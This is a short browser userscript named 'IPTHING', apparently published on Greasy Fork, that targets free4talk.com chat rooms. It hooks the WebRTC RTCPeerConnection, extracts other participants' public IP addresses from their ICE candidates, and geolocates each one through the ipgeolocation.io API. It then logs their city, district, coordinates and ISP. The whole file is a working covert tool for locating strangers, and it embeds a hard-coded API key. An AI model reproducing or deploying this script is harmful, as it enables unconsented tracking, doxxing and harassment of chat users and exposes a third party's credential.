// ==UserScript==
// @name        IPTHING
// @namespace   Violentmonkey Scripts
// @match       https://www.free4talk.com/room/*
// @grant       none
// @version     1.0
// @author      Azeez
// @license     MIT
// @description A very unreliable IP Grabber
// @downloadURL https://update.greasyfork.org/scripts/490135/IPTHING.user.js
// @updateURL https://update.greasyfork.org/scripts/490135/IPTHING.meta.js
// ==/UserScript==

const ipMap = {}

const apiKey = "6933e0e1d7444635ae1f837f0a82b71d";

window.oRTCPeerConnection =
  window.oRTCPeerConnection || window.RTCPeerConnection;

window.RTCPeerConnection = function (...args) {
  const pc = new window.oRTCPeerConnection(...args);

  pc.oaddIceCandidate = pc.addIceCandidate;

  pc.addIceCandidate = function (iceCandidate, ...rest) {
    const fields = iceCandidate.candidate.split(" ");

    //console.log(iceCandidate.candidate);
    const ip = fields[4];
    if (fields[7] === "srflx") {
      getLocation(ip);
    }
    return pc.oaddIceCandidate(iceCandidate, ...rest);
  };
  return pc;
};


let getLocation = async (ip) => {
  let url = `https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${ip}`;
  if(ipMap[ip]) return;
  ipMap[ip] = true;
  await fetch(url).then((response) =>
    response.json().then((json) => {
    ipMap[ip]=response;
    const output = `
------------------------------------
  Country: ${json.country_name}
  State: ${json.state_prov}
  City: ${json.city}
  District: ${json.district}
  Lat / Long: (${json.latitude}, ${json.longitude})
  IP: ${ip}
  Provider: ${json.isp}
  Time: ${new Date().toLocaleTimeString()}
------------------------------------
`;
      console.log(output);
    })
  );
};